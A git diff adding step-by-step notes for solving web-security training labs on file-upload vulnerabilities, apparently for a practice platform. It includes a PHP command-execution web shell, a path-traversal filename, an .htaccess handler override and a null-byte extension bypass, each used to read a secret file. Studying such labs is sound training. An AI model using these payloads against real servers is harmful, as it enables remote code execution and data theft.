@@ -12,4 +12,15 @@ Login -> Create a php file `<?php echo system($_GET['command']); ?>` -> Name it 
 
 Login -> Create a php file `<?php echo system($_GET['command']); ?>` -> Name it anything (e.g shell.php) -> Upload that file -> capture that request -> Change the filename to `..%2fshell.php` -> send -> Its uploaded -> Now go back to my-account -> Right click the image and view it in a new tab -> In url change /files/avatars/..%2fshell.php to /files/avatars/../shell.php ->send -> now get the answer using `/files/avatars/../shell.php?command=cat /home/carlos/secret`
 
-# 
+# Web shell upload via extension blacklist bypass
+
+Login -> Upload a php file -> rejected -> capture that request -> In response see the Server: Apache/2.4.41 (Ubuntu) -> So change the filename=".htaccess", Content-Type: text/plain and add the content `AddType application/x-httpd-php .php5` -> Send -> Its been uplaoded -> Now again go back to Request and make filename="shell.php5", add the content `<?php echo file_get_contents('/home/carlos/secret'); ?>` -> send -> Go back to my-account -> Right click the image and view it in a new tab & get the answer
+
+
+# Lab: Web shell upload via obfuscated file extension
+
+Login -> Upload a php file `<?php echo file_get_contents('/home/carlos/secret'); ?>` -> Name it anything (e.g shell.php) -> Upload that file -> Rejected -> capture that request -> Change the filename to shell.php%00.jpg -> send again -> Accepted -> Go back to my-account -> Right click the image and view it in a new tab -> Change the url from /files/avatars/shell.php%00.jpg to /files/avatars/shell.php -> Enter and get the answer
+
+
+# Lab: Remote code execution via polyglot web shell upload
+
